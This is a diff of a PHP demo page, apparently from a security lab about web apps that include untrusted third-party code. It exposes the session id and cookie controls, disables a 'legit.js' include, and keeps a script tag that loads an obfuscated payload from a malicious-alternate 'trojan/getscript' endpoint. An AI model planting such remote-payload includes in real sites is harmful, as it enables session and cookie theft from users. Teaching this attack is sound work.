@@ -42,6 +42,17 @@ include(INCDIR.'header.php');
 Here's a legitimate web application that incorporates code from an
 untrusted source.
 </p>
+<h3>Private session information</h3>
+<p class="instructions" id="session">Session id: <?=session_id()?></p>
+<form action="">
+<input type="text" name="value" value="Input value here"></input>
+<input type="submit" value="Submit"></input>
+</form>
+<input type="text" id="setkey" value="cookie-key"></input>
+<input type="text" id="setval" value="cookie-value"></input>
+<input type="button" id="setbtn" value="Set cookie"></input>
+<input type="text" id="getkey" value="cookie-key"></input>
+<input type="button" id="getbtn" value="Get cookie"></input>
 
 <!-- colorpicker begin -->
 <div class="demo">
@@ -60,7 +71,7 @@ Simple Colorpicker
 </div><!-- End demo -->
 <!-- colorpicker end -->
 
-<script type="text/javascript" src="<?=TGTROOT?>trojan/legit.js"></script>
+<!--<script type="text/javascript" src="<?=TGTROOT?>trojan/legit.js"></script>-->
 <script type="text/javascript" src="<?=MALALTROOT?>trojan/getscript?payload=<?=AttrEscape(urlencode($pl))?>&obfu=<?=AttrEscape(urlencode($obfu))?>"></script>
 <?
 
